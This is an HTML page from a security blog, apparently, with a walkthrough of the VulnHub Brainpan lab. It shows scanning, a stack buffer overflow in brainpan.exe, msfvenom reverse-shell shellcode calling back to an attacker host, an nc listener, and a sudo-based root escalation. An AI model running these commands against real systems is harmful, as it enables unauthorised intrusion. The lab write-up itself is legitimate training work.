@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机Brainpan - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2023 // 09 / 11</div>
+  <div class="mk-post-title">vulnhub靶机Brainpan</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="mk-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="mk-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="mk-post-content" >
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#discovery">主机发现</a></li>
+        <li class="toc-h4"><a href="#portscan">端口扫描</a></li>
+        <li class="toc-h5"><a href="#portscan-base">端口扫描</a></li>
+        <li class="toc-h5"><a href="#portscan-service">服务扫描</a></li>
+        <li class="toc-h5"><a href="#portscan-vuln">漏洞扫描</a></li>
+        <li class="toc-h4"><a href="#web">Web 信息收集</a></li>
+        <li class="toc-h4"><a href="#exe">brainpan.exe 分析</a></li>
+        <li class="toc-h5"><a href="#exe-strings">strings 分析</a></li>
+        <li class="toc-h5"><a href="#exe-crash">崩溃测试</a></li>
+        <li class="toc-h4"><a href="#bo">缓冲区溢出利用</a></li>
+        <li class="toc-h5"><a href="#bo-offset">偏移量计算</a></li>
+        <li class="toc-h5"><a href="#bo-badchars">坏字符排查</a></li>
+        <li class="toc-h5"><a href="#bo-jmp">JMP ESP 定位</a></li>
+        <li class="toc-h5"><a href="#bo-shellcode">Shellcode 生成</a></li>
+        <li class="toc-h4"><a href="#exploit">远程利用</a></li>
+        <li class="toc-h5"><a href="#exploit-linux">Linux Shell 生成</a></li>
+        <li class="toc-h4"><a href="#privesc">权限提升</a></li>
+      </ul>
+    </nav>
+
+    <h4 id="discovery">主机发现</h4>
+    <p>使用 arp-scan 扫描局域网内的存活主机：</p>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image001.png" alt="arp-scan 结果"></p>
+
+    <h4 id="portscan">端口扫描</h4>
+
+    <h5 id="portscan-base">端口扫描</h5>
+    <p>使用 nmap 全端口扫描：</p>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.156</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image002.png" alt="nmap 全端口扫描"></p>
+
+    <h5 id="portscan-service">服务扫描</h5>
+    <pre><code>nmap -sV -sT -O -p9999,10000 192.168.21.156</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image003.png" alt="nmap 服务扫描"></p>
+    <p>看到 10000 端口是 Python 启动的 Web 服务，比较可疑。</p>
+
+    <h5 id="portscan-vuln">漏洞扫描</h5>
+    <pre><code>nmap --script=vuln -p9999,10000 192.168.21.156</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image004.png" alt="nmap 漏洞扫描"></p>
+
+    <h4 id="web">Web 信息收集</h4>
+    <p>访问 10000 端口：</p>
+    <p><img loading="lazy" src="../assets/bp_image005.png" alt="Web 页面"></p>
+    <p><img loading="lazy" src="../assets/bp_image006.png" alt="Web 页面源码"></p>
+    <p>页面只有一张图片，使用 dirb 扫描目录：</p>
+    <pre><code>dirb http://192.168.21.156:10000</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image007.png" alt="dirb 扫描"></p>
+    <p><img loading="lazy" src="../assets/bp_image008.png" alt="dirb 结果"></p>
+    <p>发现一个 <code>bin</code> 目录，里面有一个 <code>brainpan.exe</code> 文件：</p>
+    <p><img loading="lazy" src="../assets/bp_image009.png" alt="bin 目录"></p>
+    <p>下载 exe 文件到本地：</p>
+    <p><img loading="lazy" src="../assets/bp_image010.png" alt="下载 exe"></p>
+    <p>文件本身没有发现异常：</p>
+    <p><img loading="lazy" src="../assets/bp_image011.png" alt="文件检查"></p>
+    <p>同时发现 9999 端口运行的服务不能直接通过 Web 交互，用 nc 连接试试：</p>
+    <pre><code>nc 192.168.21.156 9999</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image012.png" alt="nc 连接 9999"></p>
+
+    <h4 id="exe">brainpan.exe 分析</h4>
+    <p>剩下的线索只有这个 exe 文件。先用 strings 查看：</p>
+
+    <h5 id="exe-strings">strings 分析</h5>
+    <pre><code>strings brainpan.exe</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image013.png" alt="strings 输出"></p>
+    <p>发现一些关键字符串，特别是 <code>[get_reply] copied %d bytes to buffer</code> 和 <code>Shitstorm</code>，说明 9999 端口上运行的也是这个 exe。测试一下 Shitstorm：</p>
+    <p><img loading="lazy" src="../assets/bp_image014.png" alt="Shitstorm 测试"></p>
+    <p>在 Windows 上运行测试：</p>
+    <p><img loading="lazy" src="../assets/bp_image015.png" alt="Windows 测试 1"></p>
+    <p><img loading="lazy" src="../assets/bp_image016.png" alt="Windows 测试 2"></p>
+    <p>发现程序中有复制字符串的函数，可能存在缓冲区溢出：</p>
+    <p><img loading="lazy" src="../assets/bp_image017.png" alt="复制函数分析"></p>
+
+    <h5 id="exe-crash">崩溃测试</h5>
+    <p>编写 Python 脚本测试程序崩溃点：</p>
+    <p><img loading="lazy" src="../assets/bp_image018.png" alt="脚本 1"></p>
+    <p><img loading="lazy" src="../assets/bp_image019.png" alt="脚本 2"></p>
+    <p>多跑几遍，发现在 600-700 字节之间出现报错：</p>
+    <p><img loading="lazy" src="../assets/bp_image020.png" alt="崩溃测试结果"></p>
+
+    <h4 id="bo">缓冲区溢出利用</h4>
+
+    <h5 id="bo-offset">偏移量计算</h5>
+    <p>使用 msf-pattern_create 生成 600 字节的随机字符串：</p>
+    <pre><code>msf-pattern_create -l 600</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image021.png" alt="pattern create"></p>
+    <p>修改脚本使用 pattern 字符串：</p>
+    <p><img loading="lazy" src="../assets/bp_image022.png" alt="修改脚本"></p>
+    <p>使用 Immunity Debugger 进行分析：</p>
+    <p><img loading="lazy" src="../assets/bp_image023.png" alt="Immunity Debugger 启动"></p>
+    <p><img loading="lazy" src="../assets/bp_image024.png" alt="运行程序"></p>
+    <p>注意 EIP 寄存器（下一条指令的位置），记录 EIP 值 <code>35724134</code>：</p>
+    <p><img loading="lazy" src="../assets/bp_image025.png" alt="EIP 值"></p>
+    <p>计算偏移量：</p>
+    <pre><code>msf-pattern_offset -l 600 -q 35724134</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image026.png" alt="偏移量计算"></p>
+    <p>确认偏移量为 524 字节，修改脚本进行验证：</p>
+    <p><img loading="lazy" src="../assets/bp_image027.png" alt="验证脚本"></p>
+    <p>再次运行：</p>
+    <p><img loading="lazy" src="../assets/bp_image028.png" alt="验证运行"></p>
+    <p><img loading="lazy" src="../assets/bp_image029.png" alt="堆栈查看"></p>
+    <p><img loading="lazy" src="../assets/bp_image030.png" alt="堆栈内容"></p>
+    <p>ASCII 编码中 42 对应 B（hex），确认 EIP 已被覆盖。在 EIP 后面放入 shellcode，将 EIP 指向 shellcode（350-400 区间），扩容 C：</p>
+    <p><img loading="lazy" src="../assets/bp_image031.png" alt="扩容脚本"></p>
+    <p>测试：</p>
+    <p><img loading="lazy" src="../assets/bp_image032.png" alt="扩容测试"></p>
+    <p><img loading="lazy" src="../assets/bp_image033.png" alt="计算字节数"></p>
+    <p>共 468 字节可用。</p>
+
+    <h5 id="bo-badchars">坏字符排查</h5>
+    <p>使用 badchars 工具生成坏字符列表：</p>
+    <pre><code>git clone https://github.com/cytopia/badchars.git
+./badchars -f ruby</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image034.png" alt="badchars 生成"></p>
+    <p>修改脚本：</p>
+    <p><img loading="lazy" src="../assets/bp_image035.png" alt="坏字符脚本"></p>
+    <p>测试：</p>
+    <p><img loading="lazy" src="../assets/bp_image036.png" alt="坏字符测试"></p>
+    <p>查看 ESP 寄存器，右键 follow in dump：</p>
+    <p><img loading="lazy" src="../assets/bp_image037.png" alt="ESP dump"></p>
+    <p>发现 00 之后出现非连续字符，确认只有 00 是坏字符。</p>
+
+    <h5 id="bo-jmp">JMP ESP 定位</h5>
+    <p>查找 JMP ESP 指令地址：</p>
+    <p><img loading="lazy" src="../assets/bp_image038.png" alt="查找 JMP ESP"></p>
+    <p><img loading="lazy" src="../assets/bp_image039.png" alt="找到 JMP ESP"></p>
+    <p>检查程序安全机制，发现全部未启用：</p>
+    <p><img loading="lazy" src="../assets/bp_image040.png" alt="安全机制"></p>
+    <p>找到 JMP ESP 地址 <code>0x311712f3</code>，由于大小端问题需要字节倒序写入。</p>
+
+    <h5 id="bo-shellcode">Shellcode 生成</h5>
+    <p>先用 msfvenom 生成 Windows 反弹 shell：</p>
+    <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=192.168.21.146 lport=666 -b "\x00" -e x86/shikata_ga_nai -f c</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image041.png" alt="Windows shellcode 生成"></p>
+    <p>使用 NOP 滑板解码：</p>
+    <p><img loading="lazy" src="../assets/bp_image042.png" alt="NOP 滑板"></p>
+    <p>测试：</p>
+    <p><img loading="lazy" src="../assets/bp_image043.png" alt="测试成功"></p>
+
+    <h4 id="exploit">远程利用</h4>
+    <p>攻击靶机需要使用 Linux 版本的 shellcode：</p>
+
+    <h5 id="exploit-linux">Linux Shell 生成</h5>
+    <pre><code>msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.21.146 lport=666 -b "\x00" -e x86/shikata_ga_nai -f c</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image044.png" alt="Linux shellcode"></p>
+    <p>修改 exploit 脚本：</p>
+    <p><img loading="lazy" src="../assets/bp_image045.png" alt="修改 exploit"></p>
+    <p>在攻击机监听端口：</p>
+    <pre><code>nc -lvnp 666</code></pre>
+    <p>执行 exploit，成功获取 Shell：</p>
+    <p><img loading="lazy" src="../assets/bp_image046.png" alt="反弹成功"></p>
+    <p>提升交互性：</p>
+    <pre><code>python -c "import pty;pty.spawn('/bin/bash')"</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image047.png" alt="TTY 提升"></p>
+
+    <h4 id="privesc">权限提升</h4>
+    <p>查看 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image048.png" alt="sudo -l"></p>
+    <p>发现可以无密码执行 <code>anansi_util</code> 命令：</p>
+    <p><img loading="lazy" src="../assets/bp_image049.png" alt="anansi_util 信息"></p>
+    <p>查看 manual 手册：</p>
+    <p><img loading="lazy" src="../assets/bp_image050.png" alt="manual 信息"></p>
+    <p><img loading="lazy" src="../assets/bp_image051.png" alt="manual 内容"></p>
+    <p>利用 manual 调用 <code>/bin/bash</code> 直接提权：</p>
+    <pre><code>sudo anansi_util manual /bin/bash</code></pre>
+    <p><img loading="lazy" src="../assets/bp_image052.png" alt="提权成功"></p>
+    <p>成功获取 root 权限。</p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand"> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG </div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.mk-post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'mk-code-wrap';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'mk-code-header';
+
+  const info = document.createElement('span');
+  info.className = 'mk-code-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'mk-code-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'mk-code-btn mk-code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'mk-code-btn mk-code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
